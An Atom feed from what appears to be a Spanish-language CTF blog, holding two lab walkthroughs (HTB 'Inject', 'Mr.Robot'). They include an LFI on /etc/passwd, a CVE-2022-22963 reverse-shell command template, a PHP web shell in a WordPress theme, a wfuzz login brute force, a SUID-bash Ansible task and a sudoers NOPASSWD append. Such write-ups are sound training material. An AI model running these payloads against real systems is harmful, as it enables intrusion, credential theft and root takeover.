<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-21T13:45:45-05:00</updated><id>http://localhost:4000/</id><title>Al3xt0r</title><subtitle>Tengo problemas de adiccion.</subtitle><entry><title>Htb Inject</title><link href="http://localhost:4000/HTB-Inject/" rel="alternate" type="text/html" title="Htb Inject" /><published>2023-06-16T00:00:00-05:00</published><updated>2023-06-16T00:00:00-05:00</updated><id>http://localhost:4000/HTB-Inject</id><content type="html" xml:base="http://localhost:4000/HTB-Inject/">&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Inject.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;en-esta-maquina-veremos&quot;&gt;En esta maquina veremos:&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Scan de puertos&lt;/li&gt;
  &lt;li&gt;LFI - Local File Inclusion&lt;/li&gt;
  &lt;li&gt;Explotando funciones CRON&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;primer-paso-port-scanning&quot;&gt;Primer paso: PORT SCANNING&lt;/h3&gt;

&lt;p&gt;Vamos a usar la herramienta nmap, ya sabemos que hay muchas combinaciones, pero me gusta usar esta por la rapidez:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 65535 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;Ip de la Maquina&amp;gt; &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; &amp;lt;Nombre del archivo que contendra la informacion&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Aunque tambien podemos usar:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &amp;lt;IP Maquina&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;A estos puertos le pasaremos un scan de &lt;strong&gt;reconocimiento&lt;/strong&gt;, pero esta vez del servicio y versiones que corren tras la pagina.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&amp;lt;Puertos&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Como sea, obtendemos lo siguiente:
&lt;img src=&quot;/assets/img/HTB_Injection/Injection-PORTS.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver cosas interesantes:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;El puerto 22 (Perteneciente al SSH) esta abierto.&lt;/li&gt;
  &lt;li&gt;No se emplea un puerto 80 o un 443 para mostrar la pagina, sino, un servicio web-proxy en el puerto &lt;strong&gt;8080&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si vamos a esa puerto, podremos ver una interfaz de subida de archivos.
&lt;img src=&quot;/assets/img/HTB_Injection/Injection-UI.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si es que subimos un archivo &lt;strong&gt;test&lt;/strong&gt;, por ejemplo, nos dejara buscar por un paramentro:&lt;/p&gt;

&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;http://&amp;lt;IP&amp;gt;:8080/show_image?img=
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Entonces, vamos a interceptar la peticion con la herramienta &lt;strong&gt;BURPSUITE&lt;/strong&gt;, para hacer test a ese parametro.&lt;/p&gt;

&lt;p&gt;En este caso usaremos un LFI clasico, “../../../etc/passwd”, esto para listar posibles ususarios dentro del sistema:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Injection-Burp1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que existe un usuario &lt;strong&gt;frank&lt;/strong&gt; y otro usuario &lt;strong&gt;phil&lt;/strong&gt;, pero realmente lo que ahora queremos hallar es la version del framework que usa esta aplicacion, asi que con &lt;strong&gt;Burpsuite&lt;/strong&gt;, nos ponemos a listar los directorios, hasta toparnos con:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Injection-Burp2.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos cosas interesantes:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Un Spring Framework&lt;/li&gt;
  &lt;li&gt;La version usada es muy antigua (2.6.5)
Si buscamos nos toparemos con un CVE, el &lt;strong&gt;CVE-2022-22963&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;cve-2022-22963&quot;&gt;CVE-2022-22963&lt;/h3&gt;
&lt;p&gt;Puedes usar la &lt;a href=&quot;https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit&quot;&gt;herramienta que yo use&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Pero si vamos a fondo, este &lt;strong&gt;CVE-2022-22963&lt;/strong&gt;, explicado de forma rapida… Emplea un fallo de implementacion, atacando una ruta en especifico &lt;strong&gt;“/functionRouter”&lt;/strong&gt;, dentro del servicio.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Le carga a la cabecera: ‘spring.cloud.function.routing-expression’, nuestro payload (En este caso una reverse shell), y la crea en el directorio temporal de la maquina.
Y bueno el comando que le carga en cuestion es el siguiente:
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;' + ((str(base64.b64encode(command.encode('&lt;/span&gt;utf-8&lt;span class=&quot;s1&quot;&gt;')))).strip('&lt;/span&gt;b&lt;span class=&quot;s1&quot;&gt;')).strip(&quot;'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;) + '}|{base64,-d}|{bash,-i}
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;Donde &lt;strong&gt;command&lt;/strong&gt; contiene nuestra reverse shell.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;continuando&quot;&gt;Continuando:&lt;/h3&gt;

&lt;p&gt;Podemos ver que ha funcionado:
&lt;img src=&quot;/assets/img/HTB_Injection/Injection-CVE.jpeg&quot; alt=&quot;&quot; /&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Injection-Burp3.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por lo que ahora queda ponernos en escucha con la herramienta &lt;strong&gt;netcat&lt;/strong&gt; o si queremos ahorrarnos tratar la tty, con &lt;strong&gt;pwncat-cs&lt;/strong&gt;.
&lt;img src=&quot;/assets/img/HTB_Injection/Injection-RS.jpeg&quot; alt=&quot;&quot; /&gt;
Si vamos investigando dentro del directorio principal del usuario &lt;strong&gt;frank&lt;/strong&gt;, vamos a toparnos con un directorio “.m2/” que contendra un archivo interesante: “settings.xml”, este contendra la password del usuario &lt;strong&gt;phil&lt;/strong&gt; (Que de igual forma podremos listar con &lt;strong&gt;burpsuite&lt;/strong&gt;):
&lt;img src=&quot;/assets/img/HTB_Injection/InjectionRS2.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como ya tenemos usuario y password de &lt;strong&gt;phil&lt;/strong&gt;, simplemente ingresamos a su cuenta y solo nos quedaria usar una herramienta de reconocimiento para ver lo que sucede detras del sistema:&lt;/p&gt;

&lt;p&gt;Podemos usar perfectamente:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;O por otro lado, servirnos de la herramienta &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;&lt;strong&gt;pspy64&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Injection-PSPY.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y nos vamos a topar con algo interesante, hay un proceso que parece ejecutar una tarea cron, que apunta a un directorio que contiene formatos .yml&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Injection-CRON.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Asi que si vamos a es ruta, vamos a poder ver que tenemos permisos de escritura, por lo que le introducimos nuestra escalada de privilegios de la siguiente forma:&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;hosts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;tasks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Privilege Escalation&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;chmod u+s /bin/bash&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;become&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Como podemos ver, esto apunta contra el propio localhost de la maquina, y ejecuta el comando a nivel de sistema que le da permiso de ser ejecutado por el user+superuser al binario “/bin/bash”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/InjectionYML.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Acto seguido tenemos 2 opciones, esperar a la tarea &lt;strong&gt;CRON&lt;/strong&gt;, o forzarla, si la queremos forzar, solo copiamos el comando, pero ejecutamos nuesto binario:
&lt;img src=&quot;/assets/img/HTB_Injection/Injection-100.jpeg&quot; alt=&quot;&quot; /&gt;
Como podemos ver, una vez que se ejecuta el permiso del binario cambia a &lt;strong&gt;“-rwsr-sr-x”&lt;/strong&gt;, por lo que para escalar privilegios solo nos queda ejecutar un:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;fin&quot;&gt;FIN&lt;/h2&gt;</content><author><name>Al3xt0r</name></author><category term="CTF" /><category term="HTB" /><category term="Writeup" /><category term="LFI" /><summary></summary></entry><entry><title>Mr.Robot CTF</title><link href="http://localhost:4000/CTF-Mr.Robot/" rel="alternate" type="text/html" title="Mr.Robot CTF" /><published>2023-06-15T00:00:00-05:00</published><updated>2023-06-15T00:00:00-05:00</updated><id>http://localhost:4000/CTF-Mr.Robot</id><content type="html" xml:base="http://localhost:4000/CTF-Mr.Robot/">&lt;h2 class=&quot;lead&quot; id=&quot;comentario&quot;&gt;Comentario:&lt;/h2&gt;
&lt;p&gt;Esta fue de las primeras maquinas que hice, inspirada en la serie &lt;strong&gt;“Mr.Robot”&lt;/strong&gt;. Tiene una forma muy entretenida de resolver, comenzamos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr.Robot1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Lista de lo que se vera en esta machine:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Reconocimiento de puertos&lt;/li&gt;
  &lt;li&gt;Explotacion&lt;/li&gt;
  &lt;li&gt;Escalada de privilegios usando SUDOERS&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 65535 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;IP-De la maquina&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;O si quieres ir a lo loco:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &amp;lt;IP- De la Maquina&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;El caso, veremos puertos interesantes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH&lt;/li&gt;
  &lt;li&gt;80 - Http&lt;/li&gt;
  &lt;li&gt;443 - Https&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ahora lo que haremos sera ver los servicios y las versiones usadas tras los puertos, usando el comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80,443 &amp;lt;IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos ver, tanto el puerto &lt;strong&gt;80,443&lt;/strong&gt; nos llevan a una pagina web:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para optimizar el proceso de enumeracion de directorios, tiraremos de un &lt;strong&gt;Script&lt;/strong&gt;, propio de la herramienta nmap.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http-enum &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; &amp;lt;IP De la Maquina&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver directorios interesantes, como:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;/robots.txt&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;/wp-login.php&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si vamos a la ruta robots veremos cosas interesantes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr6.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/Mr.Robot/Mr5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos descargamos lo que parece ser un diccionario, el archivo &lt;strong&gt;fsocity.dic&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Y si lo analizamos, podremos ver que es un diccionario “extenso”:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr7.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/Mr.Robot/Mr8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero si filtramos por el comando “sort”, para ordenar si es que existen cadenas de texto iguales, podremos ver passwords repetidas, asi que eliminaremos eso y nos quedaremos solo con las &lt;strong&gt;unicas&lt;/strong&gt; y lo almacenaremos en un nuevo diccionario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;intrusion&quot;&gt;Intrusion&lt;/h2&gt;

&lt;p&gt;Ahora nos quedaria tirar de un ataque de fuerza bruta contra el directorio de login que descrubrimos anteriormente, “&lt;strong&gt;/wp-login.php&lt;/strong&gt;”&lt;/p&gt;

&lt;p&gt;Si tratamos de testear al usuario, veremos que “&lt;strong&gt;admin&lt;/strong&gt;”” no es un usuario existente:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero si hemos visto la serie, uno de los personajes principales tiene de nombre &lt;strong&gt;“Elliot Alderson”&lt;/strong&gt;, asi que veamos si existe el usuario “&lt;strong&gt;elliot&lt;/strong&gt;”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos ver, el usuario es existente, por lo que trataremos de aplicarle &lt;strong&gt;fuerza bruta&lt;/strong&gt; al campo de la password.
Usando la herramienta &lt;strong&gt;burpsuite&lt;/strong&gt;, interceptaremos la peticion para obtener informacion importante:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver cositas:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;La  cabecera lleva una “Cookie”&lt;/li&gt;
  &lt;li&gt;El campo que queremos bruteforcear se fija en &lt;strong&gt;log=elliot&amp;amp;pwd=Password&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Yo use la herramienta &lt;strong&gt;wfuzz&lt;/strong&gt; para aplicar el ataque, pero puedes usar tranquilamente burpsuite pasandole el diccionario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;El comando utilizado fue:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &amp;lt;URL De la Maquina&amp;gt;/wp-login.php &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Cookie: &amp;lt;Cabecera que sacamos del burpsuite&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;log=elliot&amp;amp;pwd=FUZZ&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &amp;lt;Ruta del diccionario que creamos&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Podemos ver que todas nos devuelven un estado 200, y una cantidad de respuesta igual a 3727, menos una password, &lt;strong&gt;“ER28-0652”&lt;/strong&gt;, esta nos devuelve un codigo &lt;strong&gt;302 - FOUND&lt;/strong&gt;. Por lo que esa es nuestra password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos ver, entramos como el usuario Elliot, ahora nos toca buscar dentro de la interfaz algo que nos permita meternos de lleno dentro del servidor.&lt;/p&gt;

&lt;p&gt;Si nos dirigimos a “Appeareance”, podemos ver el codigo que se emplea para cuando se da un &lt;strong&gt;“404 Not Found”&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr15.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/Mr.Robot/Mr16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Asi que como tenemos opcion de modificar la funcion, le introducimos un codigo php malicioso:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto nos permite ejecutar codigo directamente en el sistema, usando php como interprete.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por lo que nos queda introducir nuestra reverse shell y ganar acceso a la maquina:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Entonces, nos queda buscar si existen binarios con permisos &lt;strong&gt;SUID&lt;/strong&gt; o similares:&lt;/p&gt;

&lt;h2 id=&quot;escalada-de-privilegios-privesc&quot;&gt;Escalada de Privilegios (PRIVESC)&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver que tenemos un binario de &lt;strong&gt;nmap&lt;/strong&gt;, pero si vemos la version, vamos a toparnos con que es muy desactualizada, asi que vamos a nuestra pagina de confianza &lt;a href=&quot;https://gtfobins.github.io&quot;&gt;GTFOBINS&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ejecutamos el comando binario como nos lo indica, y podemos ejecutar comandos como root:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/MrRobot21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En este caso, podemos explotar el fichero de &lt;strong&gt;/etc/sudoers&lt;/strong&gt;, para no introducir password, o podemos darle permisos de super usuario al binario de &lt;strong&gt;/bin/bash&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;Para el sudoers:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ALL ALL=(ALL) NOPASSWD: ALL&quot;&lt;/span&gt; | tee &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; /etc/sudoers
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Para el binario de &lt;strong&gt;bash&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod u+s /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Para finalizar, si estas en &lt;strong&gt;TryHackMe&lt;/strong&gt;, aqui te doy la forma rapida de tener las llaves:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;fin&quot;&gt;FIN&lt;/h2&gt;</content><author><name>Al3xt0r</name></author><category term="CTF" /><category term="VulnHub" /><summary>Comentario:
Esta fue de las primeras maquinas que hice, inspirada en la serie “Mr.Robot”. Tiene una forma muy entretenida de resolver, comenzamos:</summary></entry></feed>
